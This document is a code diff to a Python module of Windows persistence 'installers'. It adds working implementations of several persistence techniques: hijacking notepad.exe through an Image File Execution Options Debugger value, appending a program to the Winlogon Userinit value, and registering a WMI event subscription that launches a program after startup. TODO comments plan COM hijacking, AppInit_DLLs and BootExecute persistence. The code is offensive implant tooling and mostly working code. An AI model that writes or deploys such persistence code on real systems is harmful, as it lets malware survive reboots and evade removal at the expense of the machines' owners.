@@ -16,8 +16,14 @@ class StartMenuInstaller(Installer):
         try:
             text = f'start "" {self.config.get_path()}'
             return self.get_autostart_path().write_text(text) == len(text)
-        except:  # TODO
+        except (OSError, IOError, PermissionError, FileNotFoundError):
             return False
+
+    def uninstall(self) -> bool:
+        if self.get_autostart_path().is_file():
+            self.get_autostart_path().unlink()
+            return True
+        return False
 
 
 class HKCUInstaller(Installer):
@@ -32,7 +38,7 @@ class HKCUInstaller(Installer):
 
     def uninstall(self) -> bool:
         k = winreg.OpenKey(self.registry, self.registry_key, 0, winreg.KEY_ALL_ACCESS)
-        winreg.DeleteKey(k, self.config.name)
+        winreg.DeleteValue(k, self.config.name)
         winreg.CloseKey(k)
         return True
 
@@ -47,23 +53,111 @@ class HKLMInstaller(HKCUInstaller):
         return self.is_root()
 
 
-class IFEOInstaller(HKLMInstaller):  # TODO
-    registry_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"
+class IFEOInstaller(HKLMInstaller):
+    registry_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
+    target_executable = "notepad.exe"  # Common target for IFEO persistence
+
+    def install(self) -> bool:
+        try:
+            # Create subkey for target executable
+            subkey_path = f"{self.registry_key}\\{self.target_executable}"
+            k = winreg.CreateKeyEx(self.registry, subkey_path, 0, winreg.KEY_ALL_ACCESS)
+            # Set Debugger value to point to our executable
+            winreg.SetValueEx(k, "Debugger", 0, winreg.REG_SZ, str(self.config.get_path()))
+            winreg.CloseKey(k)
+            return True
+        except (OSError, PermissionError, FileNotFoundError):
+            return False
+
+    def uninstall(self) -> bool:
+        try:
+            # Remove the IFEO subkey for the target executable
+            subkey_path = f"{self.registry_key}\\{self.target_executable}"
+            winreg.DeleteKey(self.registry, subkey_path)
+            return True
+        except (OSError, PermissionError, FileNotFoundError, WindowsError):
+            return False
 
     def is_supported(self) -> bool:
-        return False
+        return self.is_root()
 
 
-class UserInitInstaller(HKLMInstaller):  # TODO
+class UserInitInstaller(HKLMInstaller):
     registry_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
 
+    def install(self) -> bool:
+        try:
+            k = winreg.OpenKey(self.registry, self.registry_key, 0, winreg.KEY_READ | winreg.KEY_WRITE)
+            current_value, _ = winreg.QueryValueEx(k, "Userinit")
+            # Append our executable to the Userinit value (separated by comma)
+            new_value = f"{current_value},{self.config.get_path()}"
+            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, new_value)
+            winreg.CloseKey(k)
+            return True
+        except (OSError, PermissionError, FileNotFoundError):
+            return False
+
+    def uninstall(self) -> bool:
+        try:
+            k = winreg.OpenKey(self.registry, self.registry_key, 0, winreg.KEY_READ | winreg.KEY_WRITE)
+            current_value, _ = winreg.QueryValueEx(k, "Userinit")
+            # Remove our executable from the Userinit value
+            new_value = current_value.replace(f",{self.config.get_path()}", "")
+            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, new_value)
+            winreg.CloseKey(k)
+            return True
+        except (OSError, PermissionError, FileNotFoundError):
+            return False
+
     def is_supported(self) -> bool:
-        return False
+        return self.is_root()
 
 
-class WMICInstaller(Installer):  # TODO
+class WMICInstaller(Installer):
+    def install(self) -> bool:
+        try:
+            # Generate unique names for WMI objects
+            filter_name = f"{self.config.name}_Filter"
+            consumer_name = f"{self.config.name}_Consumer"
+            binding_name = f"{self.config.name}_Binding"
+            
+            # Create WMI Event Filter (triggers on system startup)
+            filter_cmd = f'''powershell -Command "$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{filter_name}'; EventNamespace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\"Win32_PerfFormattedData_PerfOS_System\\" AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320'}}; exit 0"'''
+            
+            # Create WMI Event Consumer (executes our program)
+            consumer_cmd = f'''powershell -Command "$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{consumer_name}'; CommandLineTemplate='{self.config.get_path()}'}}; exit 0"'''
+            
+            # Bind filter to consumer
+            binding_cmd = f'''powershell -Command "$binding = Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=[ref](Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\"Name='{filter_name}'\\" ); Consumer=[ref](Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\"Name='{consumer_name}'\\" )}}; exit 0"'''
+            
+            # Execute commands
+            check_output(filter_cmd, shell=True)
+            check_output(consumer_cmd, shell=True)
+            check_output(binding_cmd, shell=True)
+            return True
+        except (OSError, PermissionError, FileNotFoundError):
+            return False
+
+    def uninstall(self) -> bool:
+        try:
+            filter_name = f"{self.config.name}_Filter"
+            consumer_name = f"{self.config.name}_Consumer"
+            
+            # Remove binding (it will be automatically removed when filter or consumer is deleted)
+            # Remove filter
+            filter_cmd = f'''powershell -Command "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\"Name='{filter_name}\\" | Remove-WmiObject; exit 0"'''
+            
+            # Remove consumer
+            consumer_cmd = f'''powershell -Command "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\"Name='{consumer_name}\\" | Remove-WmiObject; exit 0"'''
+            
+            check_output(filter_cmd, shell=True)
+            check_output(consumer_cmd, shell=True)
+            return True
+        except (OSError, PermissionError, FileNotFoundError):
+            return False
+
     def is_supported(self) -> bool:
-        return False
+        return self.is_root()
 
 
 class SchTaskInstaller(Installer):
@@ -114,7 +208,7 @@ class SchTaskInstaller(Installer):
     <WakeToRun>false</WakeToRun>
     <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
     <Priority>2</Priority>
-    <RestartOnFailure>main
+    <RestartOnFailure>
       <Interval>PT1M</Interval>
       <Count>999</Count>
     </RestartOnFailure>
@@ -136,15 +230,25 @@ class SchTaskInstaller(Installer):
             check_output(f"cmd /C schtasks /create /xml {fp} /tn {self.config.name}", shell=True)
             fp.unlink()
             return True
-        except:  # TODO
+        except (OSError, IOError, PermissionError, FileNotFoundError):
             return False
 
     def uninstall(self) -> bool:
         try:
             check_output(f'cmd /C schtasks /delete /tn "{self.config.name}"')
             return True
-        except:  # TODO
+        except (OSError, IOError, PermissionError, FileNotFoundError):
             return False
 
     def is_supported(self) -> bool:
         return True
+
+
+# TODO: Implement ServiceInstaller for Windows Service creation
+# TODO: Implement GroupPolicyInstaller for Group Policy-based persistence
+# TODO: Implement AppInitInstaller for AppInit_DLLs persistence
+# TODO: Implement ScreensaverInstaller for screensaver-based persistence
+# TODO: Implement COMHijackInstaller for COM object hijacking
+# TODO: Implement ShellExtensionInstaller for shell extension persistence
+# TODO: Implement BootExecuteInstaller for BootExecute registry key
+# TODO: Implement PrintMonitorInstaller for print monitor persistence
